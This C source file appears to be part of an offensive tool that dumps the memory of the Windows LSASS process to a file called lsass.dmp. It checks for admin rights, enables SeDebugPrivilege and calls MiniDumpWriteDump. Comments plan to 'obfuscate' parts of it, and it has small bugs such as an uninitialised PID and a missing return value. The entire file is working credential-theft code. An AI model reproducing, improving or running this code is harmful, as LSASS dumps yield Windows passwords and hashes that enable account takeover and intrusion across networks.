#include <windows.h>
#include <tlhelp32.h>
#include <stdbool.h>
#include <wchar.h>
#include <dbghelp.h>

#include "entrypoint.h"

// todo : getPID by hash and move to windows.c
DWORD GetLsassPid() {
    DWORD pid;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (_stricmp(processEntry.szExeFile, "lsass.exe") == 0) {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

// todo : obfuscate and move to windows.c
bool isElevatedProcess() {
    bool isElevated = false;
    HANDLE access_token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(access_token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            isElevated = elevation.TokenIsElevated;
        }
    }
    if (access_token) {
        CloseHandle(access_token);
    }
    return isElevated;
}

bool setPrivilege() {
    bool status = true;
    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE tokenPriv = NULL;
    LUID luid = { 0,0 };
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv)) {
        status = false;
        if (tokenPriv) {
            CloseHandle(tokenPriv);
            return status;
        }
    }
    if (!LookupPrivilegeValueW(0, L"SeDebugPrivilege", &luid)) {
        status = false;
        if (tokenPriv) {
            CloseHandle(tokenPriv);
            return status;
        }
    }
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

    if (!AdjustTokenPrivileges(tokenPriv, false, &priv, sizeof(priv), 0, 0)) {
        status = false;
        if (tokenPriv) {
            CloseHandle(tokenPriv);
            return status;
        }
    }

}

void entrypoint() {

    if (!isElevatedProcess()) {
        MessageBoxA(NULL, "Process is not running as admin.", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    DWORD pid = GetLsassPid();
    if (pid == 0) {
        MessageBoxA(NULL, "LSASS not found.", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    if (setPrivilege()) {
        MessageBoxA(NULL, "Successfully adjusted privileges.", "Info", MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBoxA(NULL, "Failed to adjust privileges.", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    HANDLE output = CreateFileW(L"lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    HANDLE hProcess = OpenProcess(accessAllow, 0, pid);

    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        bool isDump = MiniDumpWriteDump(hProcess, pid, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
        if (isDump) {
            MessageBoxA(NULL, "Successfully wrote dump file to lsass.dump", "Info", MB_OK | MB_ICONINFORMATION);
        } else {
            DWORD error = GetLastError();
            char buffer[256];
            MessageBoxA(NULL, "MiniDumpWriteDump ERROR", "Error", MB_OK | MB_ICONERROR);
        }
    }

    // Write the dump to the file
    // ...
    CloseHandle(hProcess);
    CloseHandle(output);
}
